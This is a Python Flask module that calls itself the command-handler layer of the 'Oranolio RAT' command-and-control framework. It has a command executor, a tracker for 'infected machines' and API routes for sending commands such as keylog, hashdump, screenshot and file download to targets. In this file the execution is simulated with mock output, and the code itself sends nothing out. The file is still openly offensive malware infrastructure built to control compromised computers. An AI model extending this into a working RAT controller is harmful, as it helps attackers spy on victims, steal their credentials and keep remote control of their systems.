#!/usr/bin/env python3
"""
Command Handlers for Oranolio RAT - Elite C2 Framework
Handles command execution, target management, and system operations
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from flask import Flask, request, jsonify, session, g
from typing import Dict, Any, List, Optional

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Import utilities
from auth_utils import api_key_or_login_required
from validation_schemas import validate_input
from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
from web_app_enhancements import log_command_execution, get_connection_manager, get_metrics_collector

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global instances
connection_manager = get_connection_manager()
metrics_collector = get_metrics_collector()

class CommandExecutor:
    """Handles command execution and management"""
    
    def __init__(self):
        self.active_commands = {}
        self.command_history = []
        self.max_history = 1000
    
    def execute_command(self, command: str, target_id: str, user_id: str, 
                       async_execution: bool = False) -> Dict[str, Any]:
        """Execute a command on a target"""
        try:
            command_id = f"cmd_{int(time.time() * 1000)}"
            start_time = time.time()
            
            # Log command execution start
            logger.info(f"Executing command '{command}' on target '{target_id}' by user {user_id}")
            
            # Create command record
            command_record = {
                'command_id': command_id,
                'command': command,
                'target_id': target_id,
                'user_id': user_id,
                'status': 'executing',
                'start_time': start_time,
                'output': '',
                'error': None,
                'execution_time': 0
            }
            
            # Store active command
            self.active_commands[command_id] = command_record
            
            # Simulate command execution
            # In a real implementation, this would interface with the C2 server
            if async_execution:
                # For async execution, return immediately
                command_record['status'] = 'queued'
                return command_record
            
            # Simulate execution time
            execution_time = min(2.0, len(command) * 0.1)  # Simulate based on command length
            time.sleep(execution_time)
            
            # Generate mock output based on command
            output, error = self._simulate_command_output(command, target_id)
            
            # Update command record
            command_record.update({
                'status': 'completed' if not error else 'failed',
                'output': output,
                'error': error,
                'execution_time': time.time() - start_time,
                'end_time': time.time()
            })
            
            # Remove from active commands
            if command_id in self.active_commands:
                del self.active_commands[command_id]
            
            # Add to history
            self.command_history.append(command_record.copy())
            if len(self.command_history) > self.max_history:
                self.command_history = self.command_history[-self.max_history:]
            
            # Log command execution
            log_command_execution(command, user_id, not bool(error), command_record['execution_time'], error)
            
            # Update connection activity
            connection_manager.update_activity(target_id, command, len(output))
            
            return command_record
            
        except Exception as e:
            # Handle execution error
            command_record = {
                'command_id': command_id if 'command_id' in locals() else f"cmd_{int(time.time() * 1000)}",
                'command': command,
                'target_id': target_id,
                'user_id': user_id,
                'status': 'failed',
                'output': '',
                'error': str(e),
                'execution_time': time.time() - start_time if 'start_time' in locals() else 0,
                'end_time': time.time()
            }
            
            # Log error
            context = ErrorContext(
                user_id=user_id,
                command=command,
                target_id=target_id,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
            
            return command_record
    
    def _simulate_command_output(self, command: str, target_id: str) -> tuple:
        """Simulate command output based on command type"""
        command_lower = command.lower().strip()
        
        if command_lower == 'whoami':
            return f"user@{target_id}", None
        elif command_lower == 'hostname':
            return target_id, None
        elif command_lower == 'pwd':
            return "/home/user", None
        elif command_lower.startswith('ls'):
            return "file1.txt\nfile2.txt\ndirectory1/", None
        elif command_lower.startswith('ps'):
            return "PID\tNAME\n1234\tpython\n5678\tchrome", None
        elif command_lower.startswith('ping'):
            return "PING 8.8.8.8: 64 bytes from 8.8.8.8: icmp_seq=1 time=10ms", None
        elif command_lower.startswith('cat'):
            return "File contents would be displayed here", None
        elif command_lower.startswith('download'):
            return "File download initiated", None
        elif command_lower.startswith('upload'):
            return "File upload completed", None
        elif command_lower.startswith('screenshot'):
            return "Screenshot captured and saved", None
        elif command_lower.startswith('keylog'):
            return "Keylogger started", None
        elif command_lower.startswith('hashdump'):
            return "Password hashes dumped successfully", None
        else:
            return f"Command '{command}' executed successfully", None
    
    def get_command_status(self, command_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a specific command"""
        # Check active commands
        if command_id in self.active_commands:
            return self.active_commands[command_id]
        
        # Check history
        for cmd in self.command_history:
            if cmd['command_id'] == command_id:
                return cmd
        
        return None
    
    def get_command_history(self, user_id: str = None, limit: int = 100) -> List[Dict[str, Any]]:
        """Get command history"""
        history = self.command_history
        
        # Filter by user if specified
        if user_id:
            history = [cmd for cmd in history if cmd.get('user_id') == user_id]
        
        # Return most recent commands
        return history[-limit:] if history else []
    
    def cancel_command(self, command_id: str, user_id: str) -> bool:
        """Cancel an active command"""
        if command_id in self.active_commands:
            cmd = self.active_commands[command_id]
            
            # Check if user has permission to cancel
            if cmd.get('user_id') != user_id:
                return False
            
            # Update command status
            cmd.update({
                'status': 'cancelled',
                'end_time': time.time(),
                'execution_time': time.time() - cmd['start_time']
            })
            
            # Move to history
            self.command_history.append(cmd.copy())
            del self.active_commands[command_id]
            
            logger.info(f"Command {command_id} cancelled by user {user_id}")
            return True
        
        return False

class TargetManager:
    """Manages targets (infected machines)"""
    
    def __init__(self):
        self.targets = {}
        self.target_history = []
    
    def add_target(self, target_id: str, hostname: str, ip_address: str, 
                  os_info: str = None, user_info: str = None) -> Dict[str, Any]:
        """Add a new target"""
        target = {
            'id': target_id,
            'hostname': hostname,
            'ip_address': ip_address,
            'os_info': os_info or 'Unknown',
            'user_info': user_info or 'Unknown',
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'is_active': True,
            'connection_count': 1,
            'metadata': {}
        }
        
        self.targets[target_id] = target
        self.target_history.append(target.copy())
        
        logger.info(f"Target added: {target_id} ({hostname}) at {ip_address}")
        return target
    
    def update_target(self, target_id: str, **kwargs) -> bool:
        """Update target information"""
        if target_id not in self.targets:
            return False
        
        # Update last seen
        self.targets[target_id]['last_seen'] = datetime.now().isoformat()
        
        # Update other fields
        for key, value in kwargs.items():
            if key in self.targets[target_id]:
                self.targets[target_id][key] = value
        
        return True
    
    def get_target(self, target_id: str) -> Optional[Dict[str, Any]]:
        """Get target information"""
        return self.targets.get(target_id)
    
    def get_all_targets(self) -> List[Dict[str, Any]]:
        """Get all targets"""
        return list(self.targets.values())
    
    def get_active_targets(self) -> List[Dict[str, Any]]:
        """Get active targets only"""
        return [target for target in self.targets.values() if target['is_active']]
    
    def deactivate_target(self, target_id: str) -> bool:
        """Deactivate a target"""
        if target_id in self.targets:
            self.targets[target_id]['is_active'] = False
            self.targets[target_id]['last_seen'] = datetime.now().isoformat()
            return True
        return False

# Global instances
command_executor = CommandExecutor()
target_manager = TargetManager()

def register_command_handlers(app: Flask):
    """Register command-related routes with the Flask app"""
    
    @app.route('/api/command/execute', methods=['POST'])
    @api_key_or_login_required
    def execute_command():
        """Execute a command on a target"""
        try:
            # Validate input
            data = request.get_json()
            validation_result = validate_input('command', data)
            
            if not validation_result.is_valid:
                return jsonify({'error': 'Validation failed', 'details': validation_result.errors}), 400
            
            command = validation_result.sanitized_value['command']
            target_id = validation_result.sanitized_value['target_id']
            async_execution = validation_result.sanitized_value.get('async', 'false') == 'true'
            
            # Get user information
            user_id = getattr(g, 'current_user', {}).get('id', 'unknown')
            
            # Execute command
            result = command_executor.execute_command(command, target_id, str(user_id), async_execution)
            
            return jsonify({
                'success': True,
                'result': result
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                command=data.get('command') if 'data' in locals() else None,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Command execution failed'}), 500
    
    @app.route('/api/command/status/<command_id>', methods=['GET'])
    @api_key_or_login_required
    def get_command_status(command_id):
        """Get status of a specific command"""
        try:
            result = command_executor.get_command_status(command_id)
            
            if not result:
                return jsonify({'error': 'Command not found'}), 404
            
            return jsonify({
                'success': True,
                'result': result
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to get command status'}), 500
    
    @app.route('/api/command/history', methods=['GET'])
    @api_key_or_login_required
    def get_command_history():
        """Get command history"""
        try:
            user_id = getattr(g, 'current_user', {}).get('id')
            limit = request.args.get('limit', 100, type=int)
            
            history = command_executor.get_command_history(str(user_id) if user_id else None, limit)
            
            return jsonify({
                'success': True,
                'history': history,
                'total': len(history)
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to get command history'}), 500
    
    @app.route('/api/command/cancel/<command_id>', methods=['POST'])
    @api_key_or_login_required
    def cancel_command(command_id):
        """Cancel an active command"""
        try:
            user_id = getattr(g, 'current_user', {}).get('id', 'unknown')
            
            success = command_executor.cancel_command(command_id, str(user_id))
            
            if not success:
                return jsonify({'error': 'Command not found or cannot be cancelled'}), 404
            
            return jsonify({
                'success': True,
                'message': 'Command cancelled successfully'
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to cancel command'}), 500
    
    @app.route('/api/targets', methods=['GET'])
    @api_key_or_login_required
    def get_targets():
        """Get all targets"""
        try:
            targets = target_manager.get_all_targets()
            
            return jsonify({
                'success': True,
                'targets': targets,
                'total': len(targets)
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to get targets'}), 500
    
    @app.route('/api/targets/active', methods=['GET'])
    @api_key_or_login_required
    def get_active_targets():
        """Get active targets only"""
        try:
            targets = target_manager.get_active_targets()
            
            return jsonify({
                'success': True,
                'targets': targets,
                'total': len(targets)
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to get active targets'}), 500
    
    @app.route('/api/targets/<target_id>', methods=['GET'])
    @api_key_or_login_required
    def get_target(target_id):
        """Get specific target information"""
        try:
            target = target_manager.get_target(target_id)
            
            if not target:
                return jsonify({'error': 'Target not found'}), 404
            
            return jsonify({
                'success': True,
                'target': target
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to get target'}), 500
    
    @app.route('/api/targets/<target_id>/deactivate', methods=['POST'])
    @api_key_or_login_required
    def deactivate_target(target_id):
        """Deactivate a target"""
        try:
            success = target_manager.deactivate_target(target_id)
            
            if not success:
                return jsonify({'error': 'Target not found'}), 404
            
            return jsonify({
                'success': True,
                'message': 'Target deactivated successfully'
            })
            
        except Exception as e:
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': str(e)}
            )
            error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
            
            return jsonify({'error': 'Failed to deactivate target'}), 500

# Example usage and testing
if __name__ == "__main__":
    print("Command Handlers")
    print("=" * 30)
    print("Command executor and target manager initialized")
    print("Routes registered:")
    print("  POST /api/command/execute - Execute command")
    print("  GET  /api/command/status/<id> - Get command status")
    print("  GET  /api/command/history - Get command history")
    print("  POST /api/command/cancel/<id> - Cancel command")
    print("  GET  /api/targets - Get all targets")
    print("  GET  /api/targets/active - Get active targets")
    print("  GET  /api/targets/<id> - Get specific target")
    print("  POST /api/targets/<id>/deactivate - Deactivate target")
    print("Command handlers ready!")